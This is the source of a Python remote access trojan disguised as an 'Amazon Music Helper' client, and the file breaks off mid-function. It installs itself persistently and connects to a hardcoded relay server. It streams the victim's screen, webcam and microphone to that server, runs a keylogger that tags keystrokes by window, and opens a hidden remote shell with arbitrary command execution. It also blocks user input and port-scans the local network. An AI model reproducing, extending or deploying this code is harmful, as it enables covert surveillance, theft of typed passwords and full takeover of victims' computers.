#!/usr/bin/env python3
"""
Amazon Music Helper
====================
Pre-configured agent. Edit the CONFIG section below before compiling.
Auto-installs persistence to %APPDATA%/.amazonmusic/ on every run.

Compile: python build_client.py
Run:     AmazonMusicHelper.exe       (uses built-in config, auto-persists)
         AmazonMusicHelper.exe --no-persist   (skip persistence)
         AmazonMusicHelper.exe --uninstall    (remove persistence)
"""

import os, io, sys, re, json, time, base64, ctypes, shutil, socket, sqlite3
import signal, logging, zipfile, argparse, threading, subprocess, random
from pathlib import Path
from datetime import datetime
from collections import deque

# ══════════════════════════════════════════════════════════════════════
# CONFIGURE THESE BEFORE COMPILING
# ══════════════════════════════════════════════════════════════════════
_SERVER  = "https://rasphere.onrender.com"   # Relay server URL
_SECRET  = "rasphere-client-key-2024"        # Client secret key
_RECON   = 5                                  # Reconnect delay (seconds)
_RECON_MAX = 120                              # Max reconnect delay for exponential backoff
_CLIENT_ID = None                             # None = auto-generate
_VERSION = "1.0.1"                           # Client version for auto-update checking
_KEEPALIVE = 300                              # Keep-alive ping interval (seconds) to prevent Render sleep
# ══════════════════════════════════════════════════════════════════════

# ── Optional deps ────────────────────────────────────────────────────
HAS = {"mss": False, "pil": False, "pynput": False, "pycaw": False,
       "pyperclip": False, "psutil": False, "cv2": False, "pyaudio": False,
       "crypto": False}
try: import mss, mss.tools; HAS["mss"] = True
except: pass
try: from PIL import Image; HAS["pil"] = True
except: pass
try: from pynput import mouse, keyboard; from pynput.mouse import Button as MB; from pynput.keyboard import Key, KeyCode; HAS["pynput"] = True
except: pass
try: from ctypes import cast, POINTER; from comtypes import CLSCTX_ALL; from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume; HAS["pycaw"] = True
except: pass
try: import pyperclip; HAS["pyperclip"] = True
except: pass
try: import psutil; HAS["psutil"] = True
except: pass
try: import cv2; HAS["cv2"] = True
except: pass
try: import pyaudio; HAS["pyaudio"] = True
except: pass
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS["crypto"] = True
except: pass
try: import socketio as sio_lib; HAS["sio"] = True
except: print("ERROR: pip install python-socketio[client]"); sys.exit(1)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s", handlers=[logging.StreamHandler()])
log = logging.getLogger("RAS")

# ── State ────────────────────────────────────────────────────────────
class S:
    def __init__(self):
        self.lock = threading.RLock(); self.conn = False; self.reg = False
        self.url = None; self.secret = None; self.cid = None
        self.mc = None; self.kc = None; self.sw = 1920; self.sh = 1080
        self.sio = None; self.scap = None; self.wcap = None
        if HAS["pynput"]:
            try: self.mc = mouse.Controller(); self.kc = keyboard.Controller()
            except: pass
        self._cache_scr()
    def _cache_scr(self):
        try:
            if HAS["mss"]:
                with mss.mss() as s: m = s.monitors[1]; self.sw, self.sh = m["width"], m["height"]; return
        except: pass
        try:
            if sys.platform == "win32" and hasattr(ctypes, "windll"):
                self.sw = ctypes.windll.user32.GetSystemMetrics(0)
                self.sh = ctypes.windll.user32.GetSystemMetrics(1)
        except: pass
state = S()

# ── Capture Engine (shared for screen & webcam) ──────────────────────
class CapEngine:
    def __init__(self, sio, source="screen"):
        self.r = False; self.sio = sio; self.src = source  # "screen" or "webcam"
        self.q = 50; self.sc = 0.5; self.fps = 15; self.cap = None
        self.monitor_idx = 1  # mss monitor index (1=primary, 2=secondary, etc.)

    def start(self):
        if self.r: return
        if self.src == "screen" and not HAS["mss"]: return
        if self.src == "webcam" and not HAS["cv2"]: return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()

    def stop(self):
        self.r = False
        if self.cap:
            try: self.cap.release() if hasattr(self.cap, "release") else self.cap.close()
            except: pass
            self.cap = None

    def _loop(self):
        try:
            if self.src == "screen":
                self.cap = mss.mss(); mon = self.cap.monitors[self.monitor_idx if self.monitor_idx < len(self.cap.monitors) else 1]
            else:
                self.cap = cv2.VideoCapture(0)
                self.cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                self.cap.set(cv2.CAP_PROP_FPS, self.fps)

            interval = 1.0 / max(1, self.fps)
            while self.r:
                t0 = time.time()
                try:
                    if self.src == "screen":
                        ss = self.cap.grab(mon)
                        if HAS["pil"]:
                            img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", "BGRX")
                            if self.sc < 1.0: img = img.resize((int(img.width*self.sc), int(img.height*self.sc)), Image.LANCZOS)
                            buf = io.BytesIO(); img.save(buf, format="JPEG", quality=self.q, optimize=True)
                            b64 = base64.b64encode(buf.getvalue()).decode()
                        else: b64 = base64.b64encode(ss.bgra).decode()
                        evt = "screen_frame"
                    else:
                        ret, frame = self.cap.read()
                        if not ret: time.sleep(0.5); continue
                        _, jpg = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.q])
                        b64 = base64.b64encode(jpg).decode()
                        evt = "webcam_frame"

                    if self.sio and self.sio.connected:
                        self.sio.emit(evt, {"image": b64, "format": "jpeg"})
                except Exception as e:
                    log.error(f"{self.src} frame err: {e}")
                    time.sleep(0.1)
                    continue
                dt = time.time() - t0
                if dt < interval: time.sleep(interval - dt)
        except Exception as e:
            log.error(f"{self.src} engine crash: {e}")
        finally: self.stop()

# ── Microphone Engine ────────────────────────────────────────────────
class MicEngine:
    """Live microphone streaming via pyaudio → WAV chunks → base64."""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.pa = None; self.stream = None

    def start(self):
        if self.r: return
        if not HAS["pyaudio"]:
            if self.sio and self.sio.connected:
                self.sio.emit("mic_status", {"active": False, "error": "pyaudio not installed on target"})
            return
        try:
            self.pa = pyaudio.PyAudio()
            self.stream = self.pa.open(
                format=pyaudio.paInt16, channels=1, rate=16000,
                input=True, frames_per_buffer=4096)
        except Exception as e:
            log.error(f"Mic init error: {e}"); self.stop()
            if self.sio and self.sio.connected:
                self.sio.emit("mic_status", {"active": False, "error": str(e)})
            return
        self.r = True
        threading.Thread(target=self._loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit("mic_status", {"active": True})

    def stop(self):
        self.r = False
        if self.stream:
            try: self.stream.stop_stream(); self.stream.close()
            except: pass
            self.stream = None
        if self.pa:
            try: self.pa.terminate()
            except: pass
            self.pa = None

    @staticmethod
    def _make_wav(pcm_data):
        """Wrap raw PCM in a minimal WAV header so browsers can decode it."""
        import struct
        data_len = len(pcm_data)
        header = struct.pack('<4sI4s4sIHHIIHH4sI',
            b'RIFF', 36 + data_len, b'WAVE', b'fmt ', 16,
            1, 1, 16000, 32000, 2, 16,
            b'data', data_len)
        return header + pcm_data

    def _loop(self):
        while self.r:
            try:
                data = self.stream.read(4096, exception_on_overflow=False)
                wav = self._make_wav(data)
                b64 = base64.b64encode(wav).decode()
                if self.sio and self.sio.connected:
                    self.sio.emit("mic_data", {"audio": b64})
            except Exception as e:
                log.error(f"Mic err: {e}")
                time.sleep(0.1)

# ── System Monitor ───────────────────────────────────────────────────
class SysMon:
    def __init__(self, sio): self.r = False; self.sio = sio
    def start(self):
        if self.r or not HAS["psutil"]: return
        self.r = True; threading.Thread(target=self._loop, daemon=True).start()
    def stop(self): self.r = False
    def _loop(self):
        while self.r:
            try:
                cpu = psutil.cpu_percent(interval=0.3); mem = psutil.virtual_memory()
                disk = psutil.disk_usage("/"); net = psutil.net_io_counters()
                sens = {}
                try:
                    t = psutil.sensors_temperatures()
                    if t:
                        for n, e in t.items():
                            if e: sens[n] = e[0].current
                except: pass
                if self.sio and self.sio.connected:
                    self.sio.emit("system_stats", {"cpu_percent": cpu, "cpu_count": psutil.cpu_count(),
                        "memory_percent": mem.percent, "memory_used_gb": round(mem.used/(1024**3),1),
                        "memory_total_gb": round(mem.total/(1024**3),1), "disk_percent": disk.percent,
                        "disk_free_gb": round(disk.free/(1024**3),1), "disk_total_gb": round(disk.total/(1024**3),1),
                        "net_sent_mb": round(net.bytes_sent/(1024**2),1), "net_recv_mb": round(net.bytes_recv/(1024**2),1),
                        "sensors": sens})
            except: pass
            time.sleep(2)

# ── Terminal Engine ──────────────────────────────────────────────────
class Term:
    def __init__(self, sio): self.s = None; self.sio = sio
    def start(self):
        self.stop()
        sh = os.environ.get("COMSPEC", "cmd.exe") if sys.platform == "win32" else os.environ.get("SHELL", "/bin/bash")
        try:
            if hasattr(os, "openpty") and not (sys.platform == "win32" and "cmd" in sh.lower()):
                mf, sf = os.openpty()
                p = subprocess.Popen([sh], stdin=sf, stdout=sf, stderr=sf, cwd=os.getcwd(), close_fds=True,
                    preexec_fn=os.setsid if hasattr(os, "setsid") else None,
                    env={**os.environ, "TERM": "xterm-256color", "COLUMNS": "120", "LINES": "40"})
                os.close(sf); use_pty = True
            else:
                kw = {"stdin": subprocess.PIPE, "stdout": subprocess.PIPE, "stderr": subprocess.STDOUT,
                      "cwd": os.getcwd(), "text": True, "bufsize": 0, "universal_newlines": True}
                if sys.platform == "win32": kw["creationflags"] = subprocess.CREATE_NO_WINDOW
                p = subprocess.Popen([sh], **kw); mf = None; use_pty = False
            q = deque(maxlen=2000); stop = threading.Event()
            def rd():
                try:
                    if use_pty:
                        while not stop.is_set():
                            try:
                                d = os.read(mf, 4096)
                                if not d: break
                                q.append(d.decode("utf-8", errors="replace"))
                            except (OSError, ValueError): break
                    else:
                        for ln in iter(p.stdout.readline, ""):
                            if stop.is_set(): break
                            q.append(ln)
                except: pass
                finally:
                    if use_pty and mf:
                        try: os.close(mf)
                        except: pass
            t = threading.Thread(target=rd, daemon=True); t.start()
            self.s = {"p": p, "rt": t, "stop": stop, "q": q, "mf": mf if use_pty else None, "pty": use_pty}
            def stream():
                while self.s and not stop.is_set():
                    out = []
                    while q: out.append(q.popleft())
                    if out and self.sio and self.sio.connected:
                        self.sio.emit("terminal_output", {"text": "".join(out)})
                    time.sleep(0.05)
            threading.Thread(target=stream, daemon=True).start()
            return True
        except Exception as e: log.error(f"Term err: {e}"); return False

    def stop(self):
        if not self.s: return
        self.s["stop"].set()
        try:
            p = self.s["p"]
            if p.poll() is None:
                try:
                    if self.s.get("mf"): os.write(self.s["mf"], b"\x04")
                    else: p.stdin.write("exit\n"); p.stdin.flush()
                except: pass
                try: p.wait(timeout=3)
                except subprocess.TimeoutExpired: p.kill()
        except: pass
        finally:
            if self.s.get("mf"):
                try: os.close(self.s["mf"])
                except: pass
        self.s = None

    def write(self, cmd):
        if not self.s: return
        try:
            p = self.s["p"]
            if p.poll() is not None: self.start(); return
            if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
            else: p.stdin.write(cmd + "\n"); p.stdin.flush()
        except Exception as e: log.error(f"Term write: {e}")

# ── Keylogger Engine ─────────────────────────────────────────────────
class Keylog:
    """Background keylogger with per-window grouping and periodic flush."""
    def __init__(self, sio):
        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
        self._last_window = ""

    def start(self):
        if self.r or not HAS["pynput"]:
            if self.sio and self.sio.connected:
                self.sio.emit("keylog_status", {"active": False, "error": "pynput not available"})
            return
        self.r = True; self.buffer = []
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        threading.Thread(target=self._flush_loop, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit("keylog_status", {"active": True})

    def stop(self):
        self.r = False; self._flush()  # send remaining
        if self.listener:
            try: self.listener.stop()
            except: pass
            self.listener = None
        if self.sio and self.sio.connected:
            self.sio.emit("keylog_status", {"active": False})

    def _active_window(self):
        try:
            if sys.platform == "win32":
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""

    def _on_press(self, key):
        try:
            k = key.char if hasattr(key, 'char') and key.char else str(key)
            wnd = self._active_window()
            if wnd != self._last_window:
                self._last_window = wnd
                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
            self.buffer.append({"k": k, "t": time.time()})
        except: pass

    def _flush(self):
        if self.buffer and self.sio and self.sio.connected:
            self.sio.emit("keylog_data", {"keys": list(self.buffer), "window": self._last_window})
            self.buffer = []

    def _flush_loop(self):
        while self.r:
            time.sleep(3)
            self._flush()

# ── System Commands ──────────────────────────────────────────────────
def _proc(): return [{"pid": p.info["pid"], "name": p.info["name"] or "?",
    "cpu": p.info["cpu_percent"] or 0, "memory": p.info["memory_percent"] or 0}
    for p in psutil.process_iter(["pid","name","cpu_percent","memory_percent"])] if HAS["psutil"] else []
def _kill(pid):
    try: p = psutil.Process(int(pid)); p.terminate()
    except: return False, "not found"
    try: p.wait(timeout=3)
    except psutil.TimeoutExpired: p.kill()
    return True, f"Killed {pid}"

def _audio():
    if not HAS["pycaw"]: return None
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume))
        return {"volume": round(v.GetMasterVolumeLevelScalar()*100), "muted": bool(v.GetMute())}
    except: return None
def _avol(lv):
    if not HAS["pycaw"]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMasterVolumeLevelScalar(max(0, min(100, lv))/100.0, None); return True
    except: return False
def _amute():
    if not HAS["pycaw"]: return False
    try:
        d = AudioUtilities.GetSpeakers(); iface = d.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        v = cast(iface, POINTER(IAudioEndpointVolume)); v.SetMute(not v.GetMute(), None); return True
    except: return False

def _monoff():
    try:
        if sys.platform == "win32" and hasattr(ctypes, "windll"): ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
        else: subprocess.run(["xset","dpms","force","off"], capture_output=True, timeout=5)
        return True
    except: return False
def _lock():
    try:
        if sys.platform == "win32" and hasattr(ctypes, "windll"):
            r = ctypes.windll.user32.LockWorkStation()
            return True if r else False
        elif sys.platform == "darwin":
            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession","-suspend"], capture_output=True, timeout=5)
            return True
        else:
            for c in [["loginctl","lock-session"],["gnome-screensaver-command","-l"],["xdg-screensaver","lock"]]:
                try: subprocess.run(c, capture_output=True, timeout=5); return True
                except FileNotFoundError: continue
            return False
    except Exception as e: log.error(f"Lock err: {e}"); return False
def _sleep():
    try:
        if sys.platform == "win32" and hasattr(ctypes, "windll"):
            # Try with shutdown privilege first
            try:
                import win32security, win32api, pywintypes, win32con
                token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
                priv = win32security.LookupPrivilegeValue(None, win32security.SE_SHUTDOWN_NAME)
                win32security.AdjustTokenPrivileges(token, False, [(priv, win32security.SE_PRIVILEGE_ENABLED)])
            except:
                pass  # pywin32 not installed, try direct call anyway
            ctypes.windll.powrprof.SetSuspendState(0, 1, 0)
            return True
        elif sys.platform == "darwin":
            subprocess.run(["pmset","sleepnow"], capture_output=True, timeout=5)
            return True
        else:
            subprocess.run(["systemctl","suspend"], capture_output=True, timeout=5)
            return True
    except Exception as e: log.error(f"Sleep err: {e}"); return False

# ── NEW: Fun Commands ────────────────────────────────────────────────
def _wallpaper(path):
    """Change desktop wallpaper from local path or URL."""
    # If it's a URL, download it first
    is_url = path.startswith("http://") or path.startswith("https://")
    if is_url:
        try:
            import urllib.request, tempfile
            fd, tmp = tempfile.mkstemp(suffix=".jpg", prefix="wp_")
            os.close(fd)
            urllib.request.urlretrieve(path, tmp)
            path = tmp
        except Exception as e: return False, f"Download failed: {e}"
    if not os.path.exists(path): return False, "File not found"
    try:
        if sys.platform == "win32":
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
            return True, "Wallpaper changed"
        elif sys.platform == "darwin":
            script = f'tell application "Finder" to set desktop picture to POSIX file "{path}"'
            subprocess.run(["osascript", "-e", script], capture_output=True)
            return True, "Wallpaper changed"
        else:
            for cmd in [
                ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
                ["feh", "--bg-scale", path],
            ]:
                try: subprocess.run(cmd, capture_output=True, timeout=5); return True, "Wallpaper set"
                except: continue
            return False, "DE not supported"
    except Exception as e: return False, str(e)

def _msgbox(title, text):
    """Show a popup message box."""
    try:
        if sys.platform == "win32":
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x40 | 0x0)
        elif sys.platform == "darwin":
            subprocess.run(["osascript", "-e", f'display dialog "{text}" with title "{title}" buttons {{"OK"}}'], capture_output=True)
        else:
            subprocess.run(["zenity", "--info", "--title", title, "--text", text], capture_output=True)
        return True, "Shown"
    except Exception as e: return False, str(e)

def _openurl(url):
    """Open URL in default browser."""
    try:
        import webbrowser; webbrowser.open(url)
        return True, f"Opened {url}"
    except Exception as e: return False, str(e)

def _screenshot():
    """Take one screenshot and return it."""
    if not HAS["mss"]: return None, "mss not available"
    try:
        with mss.mss() as sct:
            ss = sct.grab(sct.monitors[1])
            if HAS["pil"]:
                img = Image.frombytes("RGB", ss.size, ss.bgra, "raw", "BGRX")
                buf = io.BytesIO(); img.save(buf, format="PNG")
                return base64.b64encode(buf.getvalue()).decode(), "png"
            return base64.b64encode(ss.bgra).decode(), "raw"
    except Exception as e: return None, str(e)

def _geoip():
    """Get approximate geolocation via IP."""
    try:
        import urllib.request
        r = urllib.request.urlopen("https://ip-api.com/json/", timeout=5)
        return json.loads(r.read().decode())
    except Exception as e: return {"error": str(e)}

def _apps():
    """List installed applications."""
    apps = []
    if sys.platform == "win32":
        for hk in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
            try:
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, hk)
                for i in range(winreg.QueryInfoKey(k)[0]):
                    try:
                        sk = winreg.OpenKey(k, winreg.EnumKey(k, i))
                        name = winreg.QueryValueEx(sk, "DisplayName")[0]
                        if name: apps.append(name)
                        winreg.CloseKey(sk)
                    except: continue
                winreg.CloseKey(k)
            except: continue
    elif sys.platform == "darwin":
        r = subprocess.run(["system_profiler", "SPApplicationsDataType"], capture_output=True, text=True, timeout=10)
        apps = [l.strip() for l in r.stdout.split("\n") if l.strip() and not l.startswith(" ")]
    else:
        r = subprocess.run(["dpkg", "-l"], capture_output=True, text=True, timeout=10)
        apps = [l.split()[1] for l in r.stdout.split("\n")[5:] if l.strip()]
    return apps[:200]

def _play_sound(freq=800, dur=1):
    """Play a beep sound (Windows)."""
    try:
        if sys.platform == "win32":
            import winsound; winsound.Beep(int(freq), int(dur*1000))
            return True, "Beeped"
        else:
            subprocess.run(["paplay", "/usr/share/sounds/freedesktop/stereo/bell.oga"], capture_output=True, timeout=3)
            return True, "Played"
    except Exception as e: return False, str(e)

def _search_files(root, pattern, max_results=50, max_depth=5):
    """Search for files matching a pattern (depth-limited for safety)."""
    results = []
    root_depth = root.rstrip(os.sep).count(os.sep)
    try:
        for dirpath, _, filenames in os.walk(root):
            depth = dirpath.count(os.sep) - root_depth
            if depth > max_depth: continue
            for f in filenames:
                if pattern.lower() in f.lower():
                    results.append(os.path.join(dirpath, f))
                    if len(results) >= max_results: return results
            if len(results) >= max_results: break
    except: pass
    return results

def _execute_command(cmd):
    """Execute a shell command and return output."""
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr, r.returncode
    except subprocess.TimeoutExpired: return "TIMEOUT", -1
    except Exception as e: return str(e), -1

def _block_input(block=True):
    """Block/unblock mouse and keyboard input (Windows only, requires admin)."""
    if sys.platform != "win32": return False, "Windows only"
    try:
        ok = ctypes.windll.user32.BlockInput(block)
        if ok: return True, "Input blocked" if block else "Input unblocked"
        return False, "Block failed (needs admin)" if block else "Unblock failed"
    except Exception as e: return False, str(e)

# ── Network Scanner ──────────────────────────────────────────────────

# Common ports to scan + their service names
_COMMON_PORTS = {
    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
    80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
    443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
    3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
    6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 9090: 'Web-Alt',
    27017: 'MongoDB', 515: 'LPD/Printer', 631: 'IPP/Printer', 9100: 'JetDirect/Printer',
    548: 'AFP', 5000: 'UPnP', 5353: 'mDNS', 7000: 'AirPlay',
    1900: 'SSDP', 5357: 'WSD', 8000: 'HTTP-Alt', 8888: 'HTTP-Alt',
    8008: 'Chromecast', 8009: 'Chromecast', 554: 'RTSP',
}

# ── MAC OUI Lookup Table ─────────────────────────────────────────────
_MAC_OUI = {
    'C0:56:27': 'TP-Link', 'B0:95:75': 'TP-Link', 'D8:47:32': 'TP-Link', 'A4:2B:B0': 'TP-Link',
    '00:11:32': 'Synology', '00:25:90': 'Supermicro',
    '3C:52:82': 'HP', 'B4:99:BA': 'HP', 'D8:9E:F3': 'HP', 'E4:11:5B': 'HP', '70:5A:0F': 'HP',
    'B8:27:EB': 'Raspberry Pi', 'DC:A6:32': 'Raspberry Pi', 'E4:5F:01': 'Raspberry Pi',
    'A4:83:E7': 'Dell', 'B8:AC:6F': 'Dell', 'F0:1F:AF': 'Dell', 'F0:D5:BF': 'Dell',
    '2C:F0:5D': 'ASUS', '0C:9D:92': 'ASUS', 'E0:CB:4E': 'ASUS',
    '18:B4:30': 'Google', '54:60:09': 'Google',
    '8A:3F:1C': 'Apple', 'A8:6B:AD': 'Apple', '8C:8D:28': 'Apple', 'AC:BC:32': 'Apple', 'F0:18:98': 'Apple',
    '94:57:2C': 'Samsung', '6C:40:08': 'Xiaomi', 'B0:83:FE': 'Reolink', 'C4:2F:90': 'Cisco',
    '00:1A:11': 'Google', '1C:87:2C': 'D-Link', '14:CC:20': 'Netgear',
    '00:50:56': 'VMware', '08:00:27': 'VirtualBox',
    '00:1B:44': 'Canon', '00:26:73': 'RICOH', '00:1C:C4': 'Brother',
    '00:1D:7E': 'Cisco-Linksys', '00:23:69': 'Cisco-Linksys',
    '60:45:BD': 'Microsoft', '00:15:5D': 'Microsoft',
    '00:0C:29': 'VMware', '00:1C:42': 'Parallels',
    'BC:92:6B': 'Apple', 'A4:D1:D2': 'Apple',
    '00:1B:63': 'Apple', '00:25:BC': 'Apple',
    'D0:D0:03': 'Samsung', 'CC:3A:61': 'Samsung',
    '18:26:49': 'Sony', '00:0D:D0': 'Sony',
    'F8:46:1C': 'Sony', 'BC:30:D9': 'Sony',
    '2C:54:91': 'Microsoft', '58:82:A8': 'Microsoft',
    '00:24:BE': 'QNAP', '00:08:9B': 'QNAP',
    '00:14:FD': 'Roku', 'B0:A7:37': 'Roku',
    '00:1E:C2': 'Apple', '54:26:96': 'Apple',
}

def _classify_machine(ip, mac_vendor, open_ports):
    """Classify a machine type based on its open ports and other clues."""
    ports = set(open_ports)

    # Gateway heuristic
    parts = ip.split('.')
    is_gw = len(parts) == 4 and int(parts[3]) in (1, 254)

    if is_gw:
        return 'router', '📡', 'Router / Gateway'

    # Strong signals
    has_windows = 445 in ports or 135 in ports or 139 in ports
    has_rdp = 3389 in ports
    has_ssh = 22 in ports
    has_web = 80 in ports or 443 in ports or 8080 in ports or 8443 in ports
    has_printer = 515 in ports or 631 in ports or 9100 in ports
    has_db = 3306 in ports or 5432 in ports or 27017 in ports or 6379 in ports
    has_nas = 548 in ports  # AFP
    has_upnp = 5000 in ports or 1900 in ports

    if has_printer:
        return 'printer', '🖨️', 'Printer'

    if has_ssh and has_web:
        return 'linux_server', '🐧', 'Linux Web Server'
    if has_ssh:
        return 'linux_server', '🐧', 'Linux/Unix Server'

    if has_windows and has_rdp:
        return 'windows_pc', '🪟', 'Windows PC'
    if has_windows and has_web:
        if has_nas or mac_vendor.lower() in ('synology', 'qnap', 'western digital', 'seagate'):
            return 'nas', '🗄️', 'NAS / File Server'
        return 'windows_server', '🪟', 'Windows Server'
    if has_rdp:
        return 'windows_pc', '🪟', 'Windows PC (RDP)'
    if has_windows:
        return 'windows_pc', '🪟', 'Windows PC'

    if has_db:
        return 'database', '🗃️', 'Database Server'

    if has_web:
        if mac_vendor.lower() in ('tp-link', 'd-link', 'netgear', 'asus', 'cisco', 'linksys', 'belkin'):
            return 'router', '📡', 'Router / AP'
        return 'web_server', '🌐', 'Web Server'

    if has_upnp:
        return 'iot', '📱', 'IoT / Media Device'

    # By MAC vendor only
    vendor_lower = mac_vendor.lower()
    if any(x in vendor_lower for x in ('apple', 'samsung', 'xiaomi', 'huawei', 'oneplus')):
        return 'mobile', '📱', 'Mobile Device'
    if any(x in vendor_lower for x in ('google', 'amazon', 'nest', 'ring', 'arlo', 'wyze')):
        return 'iot', '🏠', 'Smart Home Device'
    if any(x in vendor_lower for x in ('raspberry', 'arduino')):
        return 'linux_server', '🥧', 'Embedded Linux'
    if any(x in vendor_lower for x in ('sony', 'lg', 'samsung', 'roku', 'vizio')):
        return 'iot', '📺', 'Smart TV / Media'
    if any(x in vendor_lower for x in ('hp', 'brother', 'canon', 'epson', 'xerox')):
        return 'printer', '🖨️', 'Printer'

    return 'unknown', '❓', 'Unknown Device'

def _scan_ports(ip, ports, timeout=0.4):
    """Quick TCP connect scan on a list of ports. Returns list of open ports."""
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            s.close()
            if result == 0:
                open_ports.append(port)
        except:
            pass
    return open_ports

def _network_info():
    """Get network interfaces, active connections, ARP table, and port-scan results."""
    info = {"interfaces": [], "connections": [], "arp": [], "local_network": [], "external_hosts": []}
    # Interfaces
    try:
        if HAS["psutil"]:
            for name, addrs in psutil.net_if_addrs().items():
                iface = {"name": name, "addresses": []}
                for addr in addrs:
                    iface["addresses"].append({
                        "family": str(addr.family),
                        "address": addr.address,
                        "netmask": addr.netmask or "",
                        "broadcast": addr.broadcast or ""
                    })
                info["interfaces"].append(iface)
    except Exception as e: info["interfaces_error"] = str(e)
    # Active connections
    try:
        if HAS["psutil"]:
            for conn in psutil.net_connections(kind='all')[:100]:
                info["connections"].append({
                    "fd": conn.fd or -1,
                    "family": str(conn.family),
                    "type": str(conn.type),
                    "local": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
                    "remote": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
                    "status": conn.status,
                    "pid": conn.pid or 0
                })
    except Exception as e: info["connections_error"] = str(e)
    # ARP table
    try:
        if sys.platform == "win32":
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
            for line in r.stdout.split("\n"):
                line = line.strip()
                if line and ("dynamic" in line.lower() or "static" in line.lower()
                             or "dynamique" in line.lower() or "statique" in line.lower()):
                    parts = line.split()
                    if len(parts) >= 2:
                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), "type": parts[-1] if len(parts) > 2 else ""})
        else:
            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
            for line in r.stdout.split("\n"):
                if "(" in line and ")" in line:
                    info["arp"].append(line.strip())
    except Exception as e: info["arp_error"] = str(e)

    # ── Port scanning + machine classification (local network devices) ──
    port_list = sorted(_COMMON_PORTS.keys())
    for arp_entry in info["arp"]:
        if not isinstance(arp_entry, dict) or not arp_entry.get("ip"):
            continue
        ip = arp_entry["ip"]
        mac = arp_entry.get("mac", "")
        # Skip multicast, broadcast, self
        if ip.startswith("224.") or ip.startswith("239.") or ip.startswith("255.") or ip == "0.0.0.0":
            continue
        # Quick MAC OUI lookup
        mac_vendor = "Unknown"
        if mac:
            parts_mac = mac.replace("-", ":").upper().split(":")
            if len(parts_mac) >= 3:
                oui = ":".join(parts_mac[:3])
                mac_vendor = _MAC_OUI.get(oui, "Unknown")
        # Scan ports
        open_ports = _scan_ports(ip, port_list)
        open_services = {p: _COMMON_PORTS[p] for p in open_ports}
        machine_type, icon, label = _classify_machine(ip, mac_vendor, open_ports)
        info["local_network"].append({
            "ip": ip, "mac": mac,
            "vendor": mac_vendor,
            "open_ports": open_ports,
            "open_services": open_services,
            "machine_type": machine_type,
            "machine_label": label,
            "machine_icon": icon,
            "arp_type": arp_entry.get("type", ""),
            "network": "local"
        })

    # ── Extract external hosts from active connections ──
    seen_ext = set()
    for conn in info.get("connections", []):
        remote = conn.get("remote", "")
        if not remote or not isinstance(remote, str):
            continue
        parts = remote.rsplit(":", 1)
        if len(parts) != 2:
            continue
        ext_ip, ext_port = parts[0], parts[1]
        # Skip local/private IPs
        if ext_ip.startswith("127.") or ext_ip.startswith("10.") or ext_ip.startswith("192.168.") or ext_ip.startswith("172."):
            # Check if it's truly private (172.16.0.0/12)
            if ext_ip.startswith("172."):
                try:
                    second = int(ext_ip.split(".")[1])
                    if 16 <= second <= 31:
                        continue
                except:
                    continue
            else:
                continue
        if ext_ip in ("0.0.0.0", "*", "::", "::1"):
            continue
        try:
            ext_port_int = int(ext_port)
        except:
            ext_port_int = 0
        svc = _COMMON_PORTS.get(ext_port_int, "")
        key = f"{ext_ip}:{ext_port}"
        if key in seen_ext:
            continue
        seen_ext.add(key)
        info["external_hosts"].append({
            "ip": ext_ip,
            "port": ext_port_int,
            "service": svc,
            "status": conn.get("status", ""),
            "pid": conn.get("pid", 0),
